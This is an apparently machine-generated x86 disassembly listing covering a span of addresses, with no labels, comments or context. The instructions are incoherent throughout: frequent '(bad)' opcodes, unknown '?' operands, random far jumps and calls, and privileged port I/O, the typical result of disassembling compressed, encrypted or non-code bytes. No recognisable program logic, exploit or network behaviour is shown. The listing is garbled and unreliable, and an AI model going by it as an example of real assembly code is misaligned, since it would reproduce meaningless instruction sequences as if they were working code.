  41dfb3:	sbb    al,BYTE PTR [ebp+0x61]
  41dfb6:	jmp    0xc9f1:0xafa8233
  41dfbd:	sbb    ecx,0x63
  41dfc0:	sbb    eax,0xb76a6b2f
  41dfc5:	mov    ebp,0x9acf7ec4
  41dfca:	push   ebx
  41dfcb:	sbb    ecx,DWORD PTR [eax+0x786e6b4d]
  41dfd1:	int    0xa3
  41dfd3:	aad    0xee
  41dfd5:	gs and eax,0x66271f1b
  41dfdb:	or     bh,bh
  41dfdd:	cmp    ch,dh
  41dfdf:	adc    eax,0x74efed78
  41dfe4:	in     al,dx
  41dfe5:	push   cs
  41dfe6:	mov    dh,0x52
  41dfe8:	mov    esp,0xbb51543
  41dfed:	adc    DWORD PTR [ecx],esp
  41dfef:	fs mov esi,0x5ff87cd6
  41dff5:	add    al,0xb9
  41dff7:	mov    esp,esp
  41dff9:	in     al,0x84
  41dffb:	inc    ecx
  41dffc:	es inc edi
  41dffe:	(bad)  
  41dfff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e000:	mov    ecx,0x5004fc70
  41e005:	ret    
  41e006:	fs xchg edi,eax
  41e008:	je     0x41e017
  41e00a:	adc    bl,BYTE PTR [edx-0x3624e15f]
  41e010:	pop    ss
  41e011:	aad    0xc1
  41e013:	and    edx,DWORD PTR [esi-0x59]
  41e016:	xchg   edi,eax
  41e017:	dec    edx
  41e018:	aad    0x5e
  41e01a:	ss push es
  41e01c:	inc    eax
  41e01d:	bound  esi,QWORD PTR [ecx*4+0x4c6e364e]
  41e024:	and    DWORD PTR [ebp-0x8],esp
  41e027:	outs   dx,BYTE PTR ds:[esi]
  41e028:	cmp    DWORD PTR [edx+0x18],edi
  41e02b:	jns    0x41e009
  41e02d:	jae    0x41e096
  41e02f:	mov    eax,ds:0x3ca0bc4c
  41e034:	ja     0x41e01d
  41e036:	mov    ?,WORD PTR [ebx]
  41e038:	jae    0x41e057
  41e03a:	sbb    BYTE PTR [ebx-0x4e7d01d7],dh
  41e040:	cld    
  41e041:	pop    edx
  41e042:	es mov esp,0xd4cd3728
  41e048:	and    eax,0x8e12dfd1
  41e04d:	cmp    al,0xc2
  41e04f:	and    ecx,DWORD PTR [ebp-0x37833316]
  41e055:	pusha  
  41e056:	mov    ebp,0xc1c863e2
  41e05b:	jb     0x41e03d
  41e05d:	fldenv fs:[ebx+0x73]
  41e061:	push   ebx
  41e062:	mov    ebp,0x3a7d78d2
  41e067:	(bad)  
  41e068:	call   0xce3adfdb
  41e06d:	and    dh,BYTE PTR [esi]
  41e06f:	dec    esi
  41e070:	mov    ds:0xbf6ca9b3,al
  41e075:	or     bh,dh
  41e077:	mov    edi,0x9b060fa3
  41e07c:	fiadd  WORD PTR [edi]
  41e07e:	mov    ebp,0xba9e7915
  41e083:	xor    al,0x6c
  41e085:	add    ebx,ebx
  41e087:	mov    ch,0x4c
  41e089:	push   esp
  41e08a:	test   eax,ebx
  41e08c:	lds    edx,FWORD PTR fs:[ebx-0x27]
  41e090:	loop   0x41e0da
  41e092:	add    cl,BYTE PTR [esi-0x50]
  41e095:	sub    ah,BYTE PTR [ecx+0x31ca45f2]
  41e09b:	mov    al,0xb6
  41e09d:	call   0xd7e6b0c6
  41e0a2:	out    0xbb,al
  41e0a4:	xlat   BYTE PTR ds:[ebx]
  41e0a5:	lods   eax,DWORD PTR ds:[esi]
  41e0a6:	push   esi
  41e0a7:	mov    ecx,0xbb2a51a3
  41e0ac:	mov    cl,0x63
  41e0ae:	add    eax,DWORD PTR [eax+0x6ebc73f9]
  41e0b4:	xchg   BYTE PTR [esi-0xee85796],al
  41e0ba:	mov    cl,0xdd
  41e0bc:	aaa    
  41e0bd:	leave  
  41e0be:	or     edi,DWORD PTR [esi+0x7]
  41e0c1:	add    esi,DWORD PTR [eax+0x17f12630]
  41e0c7:	inc    ecx
  41e0c8:	(bad)  
  41e0c9:	cmc    
  41e0ca:	xlat   BYTE PTR ds:[ebx]
  41e0cb:	xor    ecx,esp
  41e0cd:	xchg   ebp,eax
  41e0ce:	iret   
  41e0cf:	sub    edi,DWORD PTR [ecx-0x32be48b7]
  41e0d5:	int    0x86
  41e0d7:	lock (bad) 
  41e0d9:	or     BYTE PTR [edx-0x2dc40f0f],dh
  41e0df:	adc    esi,DWORD PTR [edx+ebp*1-0x56734486]
  41e0e6:	prefetch BYTE PTR [ebx]
  41e0e9:	jp     0x41e10e
  41e0eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0ec:	lock fidivr DWORD PTR [ebx+0x535034ce]
  41e0f3:	mov    dh,0xd8
  41e0f5:	push   0xffffffe0
  41e0f7:	cli    
  41e0f8:	add    al,BYTE PTR [ebp-0xf]
  41e0fb:	xchg   ebp,eax
  41e0fc:	inc    ebp
  41e0fd:	daa    
  41e0fe:	adc    eax,0x2594748c
  41e103:	cmp    DWORD PTR [ecx],esi
  41e105:	es jbe 0x41e14f
  41e108:	in     eax,0x78
  41e10a:	push   edi
  41e10b:	inc    eax
  41e10c:	shl    dl,1
  41e10e:	add    eax,0xfbe0ccae
  41e113:	loop   0x41e134
  41e115:	push   edi
  41e116:	mov    dl,0x6c
  41e118:	xor    DWORD PTR [esi+0x7a89e5ec],esp
  41e11e:	jne    0x41e0ea
  41e120:	xchg   edi,eax
  41e121:	inc    edi
  41e122:	dec    edi
  41e123:	sub    al,0x90
  41e125:	daa    
  41e126:	sub    edi,esp
  41e128:	mov    edi,0x57b08f32
  41e12d:	inc    esi
  41e12e:	mov    al,0x34
  41e130:	inc    edx
  41e131:	cmp    esp,DWORD PTR [eax-0x67]
  41e134:	sahf   
  41e135:	into   
  41e136:	inc    edi
  41e137:	fsubr  DWORD PTR [edi+esi*1-0x41]
  41e13b:	sbb    edi,ebp
  41e13d:	sar    cl,0xa1
  41e140:	and    BYTE PTR [ebx],0x71
  41e143:	mov    eax,0xe9f21296
  41e148:	jmp    0x925d9587
  41e14d:	push   fs
  41e14f:	sti    
  41e150:	xchg   DWORD PTR [eax],eax
  41e152:	fnsave [esi+0x6f]
  41e155:	push   edi
  41e156:	test   eax,0xfe828be6
  41e15b:	cmp    ebp,DWORD PTR [ebx+0x4d85fbbe]
  41e161:	call   0xe15c:0xbf53684a
  41e168:	outs   dx,BYTE PTR ds:[esi]
  41e169:	cmp    cl,bh
  41e16b:	out    0x4,eax
  41e16d:	jne    0x41e18c
  41e16f:	(bad)  
  41e170:	push   edx
  41e171:	outs   dx,DWORD PTR ds:[esi]
  41e172:	xchg   edi,eax
  41e173:	popf   
  41e174:	mov    DWORD PTR [edi],ebx
  41e176:	mov    ecx,0x790fe379
  41e17b:	adc    cl,BYTE PTR [ebp-0x63cc29e6]
  41e181:	fs int3 
  41e183:	inc    ebp
  41e184:	or     BYTE PTR [eax],cl
  41e186:	xor    eax,0x886ac098
  41e18b:	mov    DWORD PTR [ebp-0x10],ecx
  41e18e:	test   BYTE PTR ds:0xbff0bfec,ah
  41e194:	outs   dx,DWORD PTR ds:[esi]
  41e195:	sub    ah,BYTE PTR [ecx-0x13]
  41e198:	dec    esi
  41e199:	xchg   edx,eax
  41e19a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e19b:	call   0x37f06c93
  41e1a0:	pop    es
  41e1a1:	mov    esi,0x147a068c
  41e1a6:	addr16 pop esp
  41e1a8:	sub    bh,BYTE PTR [edi]
  41e1aa:	rcl    DWORD PTR [eax-0x64],cl
  41e1ad:	lods   eax,DWORD PTR ds:[esi]
  41e1ae:	mov    edi,0x505c3a93
  41e1b3:	mov    ecx,0x26ce71bd
  41e1b8:	push   di
  41e1ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1bb:	cdq    
  41e1bc:	mov    cl,0x21
  41e1be:	inc    esi
  41e1bf:	lods   eax,DWORD PTR ds:[esi]
  41e1c0:	in     eax,0x9f
  41e1c2:	pop    eax
  41e1c3:	mov    esi,0x23899b8c
  41e1c8:	cmp    cl,0x66
  41e1cb:	into   
  41e1cc:	sub    BYTE PTR [esi],dl
  41e1ce:	mov    esi,0x9ab3f8d6
  41e1d3:	dec    edx
  41e1d4:	mov    ebx,0x4da58b92
  41e1d9:	xchg   esp,eax
  41e1da:	dec    edx
  41e1db:	mov    eax,0xdd2d2c48
  41e1e0:	mov    edx,0x82388738
  41e1e5:	dec    ecx
  41e1e6:	out    0x56,al
  41e1e8:	enter  0x8b1f,0xa6
  41e1ec:	loope  0x41e1a8
  41e1ee:	mov    edi,0xbe606db4
  41e1f3:	fwait
  41e1f4:	scas   eax,DWORD PTR es:[edi]
  41e1f5:	add    BYTE PTR [ecx],ah
  41e1f7:	out    dx,eax
  41e1f8:	sbb    al,0xad
  41e1fa:	and    ebx,DWORD PTR [edx-0x4fea2a46]
  41e200:	xor    al,0xe2
  41e202:	xchg   esi,eax
  41e203:	push   esi
  41e204:	add    al,0xbf
  41e206:	stos   BYTE PTR es:[edi],al
  41e207:	dec    esi
  41e208:	push   ecx
  41e209:	fdiv   st,st(3)
  41e20b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e20c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e20d:	pop    ebp
  41e20e:	mov    cl,0xb7
  41e210:	jg     0x41e211
  41e212:	cmp    eax,0x4677a80e
  41e217:	pop    ss
  41e218:	add    eax,0xfcc0862e
  41e21d:	sub    ch,BYTE PTR [edx]
  41e21f:	hlt    
  41e220:	cmp    edx,DWORD PTR [edx]
  41e222:	add    DWORD PTR [esp+esi*2],0x6d99d0b7
  41e229:	aas    
  41e22a:	mov    dl,BYTE PTR [ecx+0x48]
  41e22d:	(bad)  
  41e22e:	cld    
  41e22f:	mov    ds:0xeb31a66d,al
  41e234:	sbb    DWORD PTR ds:0xd1d30892,edi
  41e23a:	sbb    BYTE PTR [esp+eiz*2+0x35bd20c5],bh
  41e241:	in     al,0x55
  41e243:	retf   0xddd3
  41e246:	test   DWORD PTR [edi+0x4a],ebx
  41e249:	popa   
  41e24a:	icebp  
  41e24b:	inc    esp
  41e24c:	push   eax
  41e24d:	pop    es
  41e24e:	jle    0x41e2bf
  41e250:	mov    cl,0x91
  41e252:	pop    esi
  41e253:	push   0xfffffff3
  41e255:	jle    0x41e1e2
  41e257:	dec    ecx
  41e258:	fisub  WORD PTR [edi+0x1]
  41e25b:	out    dx,eax
  41e25c:	test   al,0x33
  41e25e:	jno    0x41e26c
  41e260:	inc    ebp
  41e261:	mov    bh,0xe6
  41e263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e264:	add    al,cl
  41e266:	lods   al,BYTE PTR ds:[esi]
  41e267:	pop    esi
  41e268:	ja     0x41e2bd
  41e26a:	bound  ecx,QWORD PTR ds:0x21e8ff0a
  41e270:	push   ebp
  41e271:	aam    0x78
  41e273:	neg    DWORD PTR [ebx]
  41e275:	and    al,0xa5
  41e277:	enter  0xf78b,0x71
  41e27b:	mov    dl,0x3f
  41e27d:	and    eax,0x6fd56d
  41e282:	and    DWORD PTR [ecx-0x5e],0xd3ee9c88
  41e289:	jae    0x41e24d
  41e28b:	leave  
  41e28c:	pop    esp
  41e28d:	aaa    
  41e28e:	mov    bl,0xfa
  41e290:	pop    eax
  41e291:	aad    0x4f
  41e293:	mov    esp,0x9cc92ed5
  41e298:	push   0xccd90e27
  41e29d:	adc    BYTE PTR [esi+0x3],0x15
  41e2a1:	fstp   QWORD PTR [ecx]
  41e2a3:	pushf  
  41e2a4:	inc    ebp
  41e2a5:	jne    0x41e272
  41e2a7:	mov    edi,0x6bc41f64
  41e2ac:	stos   BYTE PTR es:[edi],al
  41e2ad:	cdq    
  41e2ae:	mov    ?,WORD PTR [edi-0x77]
  41e2b1:	cmp    edi,ecx
  41e2b3:	xchg   BYTE PTR [edx+0x3d],cl
  41e2b6:	push   ebx
  41e2b7:	pop    ecx
  41e2b8:	(bad)  
  41e2b9:	xchg   ebp,eax
  41e2ba:	xchg   ebx,eax
  41e2bb:	push   cs
  41e2bc:	jmp    0x116977f6
  41e2c1:	xor    al,0x82
  41e2c3:	mov    ch,0x6a
  41e2c5:	fisubr DWORD PTR [ecx-0x61]
  41e2c8:	ret    
  41e2c9:	lods   eax,DWORD PTR ds:[esi]
  41e2ca:	iret   
  41e2cb:	add    ch,0x66
  41e2ce:	pop    edi
  41e2cf:	push   esp
  41e2d0:	mov    ch,0x9c
  41e2d2:	int    0x6d
  41e2d4:	lahf   
  41e2d5:	outs   dx,BYTE PTR ds:[esi]
  41e2d6:	daa    
  41e2d7:	repz iret 
  41e2d9:	call   0x33b1c39b
  41e2de:	imul   esi,DWORD PTR [ecx],0xc505c114
  41e2e4:	inc    ebx
  41e2e5:	add    ecx,DWORD PTR [esi-0x26]
  41e2e8:	adc    bh,BYTE PTR [edi+0x76]
  41e2eb:	and    ecx,DWORD PTR [ecx-0x58262b3d]
  41e2f1:	push   ebp
  41e2f2:	and    al,0x8a
  41e2f4:	call   DWORD PTR [esi+eax*1+0x3f32c2e7]
  41e2fb:	sbb    bh,bh
  41e2fd:	in     al,0x3c
  41e2ff:	test   ch,0xfc
  41e302:	outs   dx,DWORD PTR ds:[esi]
  41e303:	nop
  41e304:	sub    DWORD PTR [eax+edx*4],ebx
  41e307:	mov    esp,0xc66d446b
  41e30c:	ja     0x41e28f
  41e30e:	push   edi
  41e30f:	aam    0xb1
  41e311:	add    ecx,DWORD PTR [esi+0x5b8bfe66]
  41e317:	imul   edi,DWORD PTR [esi-0x78],0x1442e229
  41e31e:	xor    eax,0x32ec7ff8
  41e323:	lods   al,BYTE PTR ds:[esi]
  41e324:	out    0xcc,al
  41e326:	(bad)  
  41e327:	push   ecx
  41e328:	repz js 0x41e326
  41e32b:	jnp    0x41e30c
  41e32d:	pop    esp
  41e32e:	inc    ebx
  41e32f:	sub    al,0xd6
  41e331:	adc    DWORD PTR [esi],ebp
  41e333:	aas    
  41e334:	push   cs
  41e335:	leave  
  41e336:	jge    0x41e2fd
  41e338:	xor    BYTE PTR [eax-0x73],0x87
  41e33c:	loope  0x41e381
  41e33e:	mov    esi,?
  41e340:	in     al,0x85
  41e342:	gs pop ebx
  41e344:	mov    ds:0x4c27402,al
  41e349:	dec    ecx
  41e34a:	dec    edi
  41e34b:	stos   BYTE PTR es:[edi],al
  41e34c:	inc    DWORD PTR [eax-0x6bb22711]
  41e352:	pop    esi
  41e353:	mov    ?,esi
  41e355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e356:	push   0x4f
  41e358:	inc    ebx
  41e359:	fadd   DWORD PTR ds:0xfa02744b
  41e35f:	mov    esi,0xabf5fdfe
  41e364:	pop    ss
  41e365:	fstp   DWORD PTR [ebp-0x5d555881]
  41e36b:	sub    DWORD PTR [eax+0x6008381c],esi
  41e371:	inc    eax
  41e372:	cmp    ecx,DWORD PTR [ebx]
  41e374:	xor    al,dh
  41e376:	add    eax,0xa6022285
  41e37b:	adc    DWORD PTR [ebx+0x1c88c12e],esi
  41e381:	popa   
  41e382:	cmp    DWORD PTR [ecx-0x414aec26],0xffffff82
  41e389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38a:	out    dx,al
  41e38b:	(bad)
  41e38e:	sbb    cl,BYTE PTR [edx-0x67445ebe]
  41e394:	scas   eax,DWORD PTR es:[edi]
  41e395:	or     eax,0xa425f2d1
  41e39a:	add    eax,0xf9fc002
  41e39f:	sub    DWORD PTR [ecx+ebp*8],esi
  41e3a2:	push   edx
  41e3a3:	add    eax,0x2e1044ff
  41e3a8:	sub    al,0x10
  41e3aa:	pop    esp
  41e3ab:	sub    BYTE PTR [ebx-0x16],al
  41e3ae:	bound  esi,QWORD PTR [eax]
  41e3b0:	cmp    DWORD PTR [ebp+0x7cb38865],esp
  41e3b6:	icebp  
  41e3b7:	and    eax,0x3e57c7c4
  41e3bc:	das    
  41e3bd:	repnz mov al,0xb2
  41e3c0:	and    dl,BYTE PTR [ebx]
  41e3c2:	add    BYTE PTR [esi],dl
  41e3c4:	cmp    edi,edi
  41e3c6:	imul   edx,DWORD PTR [eax+ebx*2],0xe44157d1
  41e3cd:	inc    ecx
  41e3ce:	xchg   ecx,eax
  41e3cf:	call   0xfb3c:0x5add7b29
  41e3d6:	and    al,0xb6
  41e3d8:	push   ebx
  41e3d9:	or     al,0xae
  41e3db:	retf   0xe31f
  41e3de:	mov    esp,0x64af82e6
  41e3e3:	(bad)  
  41e3e4:	cmp    bh,bh
  41e3e6:	test   BYTE PTR [edi+0x6bc8a85d],ch
  41e3ec:	out    dx,eax
  41e3ed:	jbe    0x41e3e5
  41e3ef:	arpl   WORD PTR [eax+0x4ad1ae92],ax
  41e3f5:	or     DWORD PTR ds:0xff6f0f3f,0xffffff80
  41e3fc:	retf   0x4144
  41e3ff:	mov    esp,0x1fde4720
  41e404:	(bad)  
  41e405:	sbb    edx,ebp
  41e407:	sahf   
  41e408:	inc    edx
  41e409:	xchg   DWORD PTR [ecx+esi*4],esi
  41e40c:	xor    DWORD PTR [edx+eiz*4],ebp
  41e40f:	push   esi
  41e410:	rcl    BYTE PTR [edi],1
  41e412:	imul   ebp,DWORD PTR [esi+0x7ce8b302],0x51
  41e419:	adc    ch,BYTE PTR [ebx]
  41e41b:	js     0x41e3cd
  41e41d:	(bad)  
  41e41e:	or     DWORD PTR [eax+0x3cf2464c],ebx
  41e424:	inc    ebx
  41e425:	cmp    edx,ecx
  41e427:	cmc    
  41e428:	lods   eax,DWORD PTR ds:[esi]
  41e429:	int    0x3f
  41e42b:	xchg   al,bh
  41e42d:	pop    edi
  41e42e:	jmp    FWORD PTR [eax+0x56]
  41e431:	js     0x41e3e5
  41e433:	mov    bl,dl
  41e435:	jae    0x41e3dd
  41e437:	into   
  41e438:	pop    ebp
  41e439:	push   ecx
  41e43a:	xor    BYTE PTR [ebx+ebp*8],0x61
  41e43e:	ins    DWORD PTR es:[edi],dx
  41e43f:	fwait
  41e440:	lock shl DWORD PTR ds:0xc906caec,0xce
  41e448:	sub    bh,BYTE PTR [esi+ebx*1-0x40]
  41e44c:	pop    esi
  41e44d:	out    dx,eax
  41e44e:	or     eax,0xdca4c0da
  41e453:	ss inc esi
  41e455:	outs   dx,DWORD PTR ds:[esi]
  41e456:	or     eax,0x72730753
  41e45b:	stos   BYTE PTR es:[edi],al
  41e45c:	jmp    0xa8870b03
  41e461:	sub    ch,BYTE PTR [edi-0x9]
  41e464:	int    0xb0
  41e466:	dec    esp
  41e467:	push   ds
  41e468:	cdq    
  41e469:	daa    
  41e46a:	out    dx,al
  41e46b:	jg     0x41e46a
  41e46d:	and    al,BYTE PTR [ecx-0x4]
  41e470:	push   ss
  41e471:	adc    BYTE PTR [ecx],ch
  41e473:	adc    eax,0x701822a4
  41e478:	push   ss
  41e479:	addr16 dec ebp
  41e47b:	mov    DWORD PTR [eax],esi
  41e47d:	in     al,0xcf
  41e47f:	inc    esi
  41e480:	adc    al,0x90
  41e482:	add    al,0xa7
  41e484:	es rcr eax,0x46
  41e488:	neg    BYTE PTR [ebp+0x127058ff]
  41e48e:	push   cs
  41e48f:	aaa    
  41e490:	xor    cl,BYTE PTR [eax-0x1b]
  41e493:	retf   0xb9e1
  41e496:	enter  0xb04c,0xab
  41e49a:	add    bh,al
  41e49c:	fwait
  41e49d:	add    BYTE PTR [eax],al
  41e49f:	mov    ds:0x104b9d2,eax
  41e4a4:	loop   0x41e522
  41e4a6:	and    eax,0xa07db44c
  41e4ab:	idiv   DWORD PTR [ebp+0x6f]
  41e4ae:	xor    al,0xaa
  41e4b0:	and    eax,0xce9cbe5c
  41e4b5:	pop    edi
  41e4b6:	stos   BYTE PTR es:[edi],al
  41e4b7:	pop    eax
  41e4b8:	mov    ds:0xa2e5c616,eax
  41e4bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4be:	xor    eax,0xafd75a41
  41e4c3:	push   eax
  41e4c4:	(bad)  
  41e4c5:	lods   al,BYTE PTR ds:[esi]
  41e4c6:	xchg   DWORD PTR [edi+0x7e],edx
  41e4c9:	push   es
  41e4ca:	and    BYTE PTR [ebx+0x33],ch
  41e4cd:	aam    0x3
  41e4cf:	push   ss
  41e4d0:	pop    ebx
  41e4d1:	aad    0x1e
  41e4d3:	xor    eax,0xe78aee18
  41e4d8:	add    cl,BYTE PTR [ebx+edi*8]
  41e4db:	loop   0x41e4ca
  41e4dd:	xor    al,0x31
  41e4e0:	ret    
  41e4e1:	adc    DWORD PTR [edx+ebp*4],edi
  41e4e4:	pusha  
  41e4e5:	outs   dx,DWORD PTR ds:[esi]
  41e4e6:	mov    al,ds:0xec45b5ae
  41e4eb:	imul   DWORD PTR [ebp+0xc]
  41e4ee:	jg     0x41e543
  41e4f0:	stos   BYTE PTR es:[edi],al
  41e4f1:	sbb    BYTE PTR [eax+eax*1-0x1c],0x9c
  41e4f6:	inc    edx
  41e4f7:	aaa    
  41e4f8:	push   cs
  41e4f9:	(bad)  
  41e4fa:	(bad)  
  41e4fc:	clc    
  41e4fd:	push   eax
  41e4fe:	repz and ebp,DWORD PTR [ecx-0x73b5a987]
  41e505:	popa   
  41e506:	in     eax,dx
  41e507:	es inc ebx
  41e509:	mov    esp,DWORD PTR [eax]
  41e50b:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41e50d:	sbb    eax,0xcf4c2754
  41e512:	ins    DWORD PTR es:[edi],dx
  41e513:	inc    edi
  41e514:	stos   BYTE PTR es:[edi],al
  41e515:	sub    eax,0xcb31ab13
  41e51a:	into   
  41e51b:	mov    ds:0xf265ceb4,eax
  41e520:	test   cl,0x9c
  41e523:	retf   
  41e524:	jmp    0xc8a4:0xe0057931
  41e52b:	sar    BYTE PTR [esi+edi*4+0x717a44ee],0x96
  41e533:	jle    0x41e501
  41e535:	sbb    ch,cl
  41e537:	inc    edi
  41e538:	inc    esp
  41e539:	out    dx,eax
  41e53a:	je     0x41e57d
  41e53c:	imul   BYTE PTR [eax-0xc642890]
  41e542:	cwde   
  41e543:	sbb    al,0x1f
  41e545:	pop    esi
  41e546:	in     al,0x15
  41e548:	sar    DWORD PTR [edi-0x4e88abfe],0xee
  41e54f:	dec    edx
  41e550:	xchg   BYTE PTR [esi],al
  41e552:	xchg   edx,eax
  41e553:	mov    ds:0x5fea8331,al
  41e558:	and    BYTE PTR [edx],cl
  41e55a:	(bad)  
  41e55b:	pop    ebp
  41e55c:	mov    esp,0x30654637
  41e561:	fdiv   st,st(6)
  41e563:	sar    BYTE PTR [eax+0x78f2b836],cl
  41e569:	shr    BYTE PTR [ecx-0x4e7e1e25],0x51
  41e570:	stos   BYTE PTR es:[edi],al
  41e571:	add    BYTE PTR [ecx-0x6333e48e],dh
  41e577:	mov    bl,0xe2
  41e579:	or     ah,BYTE PTR [esi]
  41e57b:	adc    al,0xed
  41e57d:	pop    esi
  41e57e:	lahf   
  41e57f:	fistp  WORD PTR [ebx+0x7e3d77ce]
  41e585:	repnz fistp DWORD PTR [eax-0x2cfb4656]
  41e58c:	(bad)  
  41e58d:	and    eax,0xc0e15f04
  41e592:	stos   DWORD PTR es:[edi],eax
  41e593:	xor    dh,BYTE PTR ds:0xc29fb1e
  41e599:	fdivr  QWORD PTR [esi-0x1592cf60]
  41e59f:	pop    esi
  41e5a0:	jno    0x41e5f1
  41e5a2:	inc    esp
  41e5a3:	arpl   WORD PTR [ebx+0x5],cx
  41e5a6:	push   ss
  41e5a7:	stos   DWORD PTR es:[edi],eax
  41e5a8:	or     BYTE PTR [eax+0x0],dh
  41e5ab:	test   DWORD PTR [edi+0x51],eax
  41e5ae:	fcomp  DWORD PTR [edi]
  41e5b0:	gs popf 
  41e5b2:	iret   
  41e5b3:	cmp    ch,BYTE PTR [eax]
  41e5b5:	cld    
  41e5b6:	mov    eax,ds:0x7d489445
  41e5bb:	ss in  eax,dx
  41e5bd:	ret    
  41e5be:	jnp    0x41e55b
  41e5c0:	push   0xffffffcc
  41e5c2:	mov    fs,ebp
  41e5c4:	push   0x1aaac0b4
  41e5c9:	add    dh,BYTE PTR [ebx-0x3123e51d]
  41e5cf:	(bad)  
  41e5d1:	popa   
  41e5d2:	add    edx,edi
  41e5d4:	jl     0x41e5d8
  41e5d6:	js     0x41e569
  41e5d8:	(bad)  
  41e5d9:	stc    
  41e5da:	cmp    al,0x59
  41e5dc:	fld    DWORD PTR [ebx-0x2b017b5a]
  41e5e2:	mov    esi,0x9a48b9dc
  41e5e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5e8:	xchg   esi,eax
  41e5e9:	in     eax,dx
  41e5ea:	and    DWORD PTR [edx+0x35179ea9],eax
  41e5f0:	or     ebx,DWORD PTR [ebp-0x2e0b3933]
  41e5f6:	pushf  
  41e5f7:	fdivr  QWORD PTR [edx+0x52429e1c]
  41e5fd:	add    eax,0xcab8a2b3
  41e602:	mov    al,0xf5
  41e604:	and    DWORD PTR [eax-0x31661801],edx
  41e60a:	ret    
  41e60b:	retf   0xf4e1
  41e60e:	scas   eax,DWORD PTR es:[edi]
  41e60f:	or     eax,0x98df4e5f
  41e614:	int3   
  41e615:	daa    
  41e616:	popa   
  41e617:	mov    ecx,0x2995dc27
  41e61c:	fdiv   DWORD PTR [esi]
  41e61e:	data16 add ch,BYTE PTR [ecx+0x333d035c]
  41e625:	xchg   esi,eax
  41e626:	in     al,0xc3
  41e628:	cmp    ecx,DWORD PTR [eax+0x2c]
  41e62b:	stos   DWORD PTR es:[edi],eax
  41e62c:	pushf  
  41e62d:	jge    0x41e64b
  41e62f:	(bad)  
  41e630:	retf   
  41e631:	mov    cl,0x91
  41e633:	popf   
  41e634:	xor    ebx,DWORD PTR [esi]
  41e636:	in     al,dx
  41e637:	(bad)  
  41e639:	repnz cwde 
  41e63b:	pop    ecx
  41e63c:	sub    DWORD PTR [edi+edx*4+0x75],esi
  41e640:	pop    ds
  41e641:	rcl    al,1
  41e643:	test   al,0x1e
  41e645:	pop    edi
  41e646:	in     eax,0x3d
  41e648:	imul   esp,edi,0x27
  41e64b:	aad    0xdc
  41e64d:	ret    0xe13d
  41e650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e651:	sub    eax,0xf0b2ab25
  41e656:	retf   
  41e657:	adc    al,0x36
  41e659:	(bad)  
  41e65a:	dec    esp
  41e65b:	xchg   BYTE PTR [esi+0x32],dh
  41e65e:	adc    al,0x53
  41e660:	dec    ecx
  41e661:	clc    
  41e662:	xchg   esi,eax
  41e663:	ldmxcsr DWORD PTR [esi-0x1c]
  41e667:	mov    ch,0x83
  41e669:	jnp    0x41e6b1
  41e66b:	adc    BYTE PTR [esi-0x4],0x6f
  41e66f:	fcomp  DWORD PTR ds:0xcdc720af
  41e675:	(bad)  
  41e677:	mov    ah,0x21
  41e679:	pop    esp
  41e67a:	cli    
  41e67b:	addr16 mov dl,ah
  41e67e:	adc    esp,edx
  41e680:	inc    ebp
  41e681:	sub    eax,0x96f4be90
  41e686:	pop    edi
  41e687:	mov    dl,0x3b
  41e689:	mov    edi,0x315caa6a
  41e68e:	(bad)  
  41e68f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e690:	bound  eax,QWORD PTR [esp+eax*4-0x763e3791]
  41e697:	xchg   edx,eax
  41e698:	gs imul esi,ecx,0x3aeac78c
  41e69f:	xor    eax,0x82788b4e
  41e6a4:	or     ecx,DWORD PTR [edi+ecx*1-0x10af48fd]
  41e6ab:	mov    al,ds:0xfa10db91
  41e6b0:	out    dx,eax
  41e6b1:	pusha  
  41e6b2:	xor    eax,0x9a0eb037
  41e6b7:	jl     0x41e6a2
  41e6b9:	out    dx,eax
  41e6ba:	iret   
  41e6bb:	ret    
  41e6bc:	test   eax,0xf581d307
  41e6c1:	das    
  41e6c2:	aam    0xda
  41e6c4:	shr    DWORD PTR [eax-0x11],cl
  41e6c7:	dec    esi
  41e6c8:	int    0x73
  41e6ca:	std    
  41e6cb:	adc    al,0xdb
  41e6cd:	stc    
  41e6ce:	out    dx,al
  41e6cf:	sub    DWORD PTR [ebp-0x7401b787],ecx
  41e6d5:	test   DWORD PTR [edx],esi
  41e6d7:	xor    ah,BYTE PTR [edx+0x40]
  41e6da:	adc    eax,0xa5890e0c
  41e6df:	pusha  
  41e6e0:	and    DWORD PTR [edi+0x55],0x52
  41e6e4:	sbb    eax,0x912d5eb3
  41e6e9:	cmp    BYTE PTR [edi+0x403d9c37],al
  41e6ef:	test   eax,0xf04addb4
  41e6f4:	mov    al,ds:0xc8813176
  41e6f9:	xchg   edi,eax
  41e6fa:	or     esi,0xbb993944
  41e700:	cmp    ebp,esp
  41e702:	rcr    DWORD PTR [edi+0x13],1
  41e705:	leave  
  41e706:	repnz or eax,0x243647cd
  41e70c:	retf   
  41e70d:	mov    esp,0xcda9894a
  41e712:	xchg   DWORD PTR [ecx+0x3e002f87],esi
  41e718:	and    edx,DWORD PTR [ebp+0x61bcdb58]
  41e71e:	push   ecx
  41e71f:	sbb    BYTE PTR [esi],ch
  41e721:	pushf  
  41e722:	adc    BYTE PTR [ebp+0xd],ch
  41e725:	and    dh,al
  41e727:	lea    ebx,[ebx]
  41e729:	or     BYTE PTR [eax-0x6b54da2e],bh
  41e72f:	jnp    0x41e7a5
  41e731:	(bad)  
  41e732:	inc    edi
  41e733:	aad    0x48
  41e735:	in     eax,0xbb
  41e737:	ins    DWORD PTR es:[edi],dx
  41e738:	in     al,dx
  41e739:	pop    ebx
  41e73a:	ffree  st(1)
  41e73c:	shl    DWORD PTR [esi+0x2914fbc9],0x95
  41e743:	push   esi
  41e744:	lds    sp,DWORD PTR [edx]
  41e747:	pop    es
  41e748:	bound  edx,QWORD PTR [edx+0x58ace6d9]
